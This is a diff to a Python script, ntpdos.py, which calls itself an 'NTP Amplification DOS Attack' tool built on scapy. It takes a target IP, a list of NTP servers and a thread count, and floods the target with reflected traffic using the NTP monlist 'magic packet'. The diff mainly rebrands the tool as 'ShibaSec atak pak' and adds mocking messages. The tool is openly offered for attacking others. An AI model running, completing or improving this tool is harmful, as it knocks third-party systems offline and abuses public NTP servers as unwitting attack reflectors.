@@ -1,4 +1,7 @@
 #!/usr/bin/env python
+
+# Much DOS thanks to vpnguy-zz
+
 from scapy.all import *
 import sys
 import threading
@@ -26,11 +29,11 @@ def deny():
 #So I dont have to have the same stuff twice
 def printhelp():
 	print "NTP Amplification DOS Attack"
-	print "By DaRkReD"
+	print "ShibaSec atak pak"
 	print "Usage ntpdos.py <target ip> <ntpserver list> <number of threads>"
 	print "ex: ex: ntpdos.py 1.2.3.4 file.txt 10"
 	print "NTP serverlist file should contain one IP per line"
-	print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
+	print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS duh"
 	exit(0)
 
 try:
@@ -54,7 +57,7 @@ try:
 	#Make sure we dont out of bounds
 	if  numberthreads > int(len(ntplist)):
 		print "Attack Aborted: More threads than servers"
-		print "Next time dont create more threads than servers"
+		print "Next time dont create more threads than servers *sighs*"
 		exit(0)
 
 	#Magic Packet aka NTP v2 Monlist Packet
@@ -63,7 +66,7 @@ try:
 	#Hold our threads
 	threads = []
 	print "Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads"
-	print "Use CTRL+C to stop attack"
+	print "Use CTRL+C to stop attack if u get scared"
 
 	#Thread spawner
 	for n in range(numberthreads):
